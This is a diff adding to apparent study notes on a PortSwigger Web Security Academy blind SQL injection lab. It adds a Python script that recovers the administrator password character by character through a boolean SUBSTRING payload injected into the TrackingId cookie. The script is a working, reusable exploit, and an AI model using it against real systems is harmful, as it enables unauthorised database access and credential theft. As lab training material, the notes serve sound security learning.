@@ -63,6 +63,51 @@ Settings → Grep - Match → Add: Welcome back!
 * moreover:
   - disable URL-encode these characters
 ----> we find password: bjpn1or4ucu1p5kbh3a2
+## With this way, we have to fill 20 (1->20), therefore:
+* **Instead, we can use python script**
+## Automating the attack with Python
+
+### Script
+
+```python
+import requests
+
+url = "https://0a4c00e603154aa280c3445a00470017.web-security-academy.net/"
+tracking_id = "ZN1CU5VRp5MJhNb8"
+session = "DqDVHsmSlYGKST4vwBmN0ZLZHj0iijvL"
+
+characters = "abcdefghijklmnopqrstuvwxyz0123456789"
+password = ""
+
+print("Starting password extraction...")
+
+for i in range(1, 21):
+    print("Testing position:", i)
+
+    for char in characters:
+        payload = (
+            f"{tracking_id}' AND "
+            f"(SELECT SUBSTRING(password,{i},1) "
+            f"FROM users WHERE username='administrator')='{char}'-- "
+        )
+
+        cookies = {
+            "TrackingId": payload,
+            "session": session
+        }
+
+        response = requests.get(url, cookies=cookies)
+
+        if "Welcome back!" in response.text:
+            password += char
+            print("Found character:", char)
+            print("Current password:", password)
+            break
+
+print("Final password:", password)
+```
+**Important note: ID change constanly, so you have to replace ID when meeting NULL**
+
 
 
 
